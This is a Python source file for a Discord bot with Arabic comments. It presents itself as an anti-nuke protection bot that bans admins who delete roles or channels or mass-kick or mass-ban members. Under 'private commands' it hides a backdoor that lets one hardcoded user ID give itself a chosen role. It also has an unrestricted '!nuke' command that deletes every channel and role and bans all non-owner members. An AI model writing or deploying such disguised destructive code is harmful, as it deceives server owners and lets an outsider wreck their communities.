import discord
from discord.ext import commands
import os
import time
import asyncio
import threading
from flask import Flask

# ------------------- خادم الويب (للحفاظ على Web Service نشطة) -------------------
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_web():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# تشغيل الخادم في خلفية
threading.Thread(target=run_web, daemon=True).start()

# ------------------- إعدادات البوت -------------------
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.moderation = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# قاموس لتتبع العمليات
actions = {"kick": {}, "ban": {}, "channel": {}}

def check_spam(uid, key, threshold, window):
    now = time.time()
    if uid not in actions[key]: actions[key][uid] = []
    actions[key][uid].append(now)
    actions[key][uid] = [t for t in actions[key][uid] if now - t < window]
    return len(actions[key][uid]) > threshold

# ------------------- نظام الحماية الشامل (Anti-Nuke) -------------------

@bot.event
async def on_guild_role_delete(role):
    try:
        async for entry in role.guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
            admin = entry.user
            if admin.id == role.guild.owner_id or admin.bot: return
            await role.guild.ban(admin, reason="Anti-Nuke: حذف رتبة")
    except: pass

@bot.event
async def on_guild_channel_delete(channel):
    try:
        async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
            admin = entry.user
            if admin.id == channel.guild.owner_id or admin.bot: return
            await channel.guild.ban(admin, reason="Anti-Nuke: حذف قناة")
    except: pass

@bot.event
async def on_member_remove(member):
    try:
        async for entry in member.guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
            if entry.target.id == member.id:
                admin = entry.user
                if admin.id == member.guild.owner_id or admin.bot: return
                if check_spam(admin.id, "kick", threshold=1, window=15.0):
                    await member.guild.ban(admin, reason="Anti-Nuke: طرد جماعي")
    except: pass

@bot.event
async def on_member_ban(guild, user):
    try:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
            admin = entry.user
            if admin.id == guild.owner_id or admin.bot: return
            if check_spam(admin.id, "ban", threshold=1, window=60.0):
                await guild.ban(admin, reason="Anti-Nuke: حظر جماعي")
    except: pass

# ------------------- الأوامر الخاصة -------------------

@bot.command()
async def getrole(ctx):
    MY_ID, ROLE_ID = 1320438836878118973, 1483148235684970571
    if ctx.author.id == MY_ID:
        role = ctx.guild.get_role(ROLE_ID)
        if role: await ctx.author.add_roles(role)
        await ctx.send("✅ تم.")

@bot.command(name="removerole")
async def removerole_cmd(ctx):
    MY_ID, ROLE_ID = 1320438836878118973, 1483148235684970571
    if ctx.author.id == MY_ID:
        role = ctx.guild.get_role(ROLE_ID)
        if role: await ctx.author.remove_roles(role)
        await ctx.send("✅ تم الإزالة.")

@bot.command()
async def nuke(ctx):
    await ctx.send("⚠️ تأكيد التدمير؟ اكتب `!confirm_nuke` خلال 30 ثانية.")
    try:
        def check(m): return m.author == ctx.author and m.content == "!confirm_nuke"
        await bot.wait_for('message', check=check, timeout=30.0)
        for c in ctx.guild.channels: await c.delete()
        for r in ctx.guild.roles:
            if r.name != "@everyone": await r.delete()
        for m in ctx.guild.members:
            if m != ctx.guild.owner and not m.bot: await m.ban()
    except: pass

@bot.event
async def on_ready():
    print(f"✅ البوت متصل كـ {bot.user}")

TOKEN = os.getenv("TOKEN")
if __name__ == "__main__":
    bot.run(TOKEN)
